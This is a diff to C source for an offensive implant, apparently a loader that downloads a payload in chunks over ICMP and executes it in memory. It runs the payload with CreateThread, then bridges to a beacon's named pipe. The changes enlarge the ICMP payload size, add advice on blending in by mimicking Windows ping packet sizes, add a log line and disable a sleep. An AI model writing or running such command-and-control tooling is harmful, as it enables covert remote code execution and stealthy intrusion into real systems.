@@ -36,12 +36,14 @@ to download your enitre payload.
 #define SLEEP_TIME 1000 
 
 // size of payload/data section of ICMP (excluding the 8-byte ICMP header)
-#define ICMP_PAYLOAD_SIZE 500  // in bytes, 
+#define ICMP_PAYLOAD_SIZE 1000  // in bytes, 
 /*
 adjust this to set the max payload size per icmp request.
 
 If trying to blend in, use 32 on windows systems. (which is the default payload size of windows `ping` command).
 Note, this will send a SHITLOAD more chunks/ICMP requests in general.
+
+Max is 1472, which is the the MTU of 1500 - 20 for IPV4, and 8 for ICMP header
 
 */
 
@@ -399,13 +401,14 @@ int bridge_to_beacon() {
 
     printf("[+] Received full payload: first 64 bytes as string:\n    %.64s\n", full_payload);
 
+    printf("[+] Injecting payload into memory w/ CreateThread");
     // 3) Inject the payload into memory and start executing it
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)full_payload, NULL, 0, NULL);
 
     // 4) Bridge to beacon’s named pipe (\\.\pipe\foobar)
     HANDLE handle_beacon = INVALID_HANDLE_VALUE;
     while (handle_beacon == INVALID_HANDLE_VALUE) {
-        Sleep(1000);
+        //Sleep(1000);
         handle_beacon = CreateFileA(
             "\\\\.\\pipe\\foobar",
             GENERIC_READ | GENERIC_WRITE,
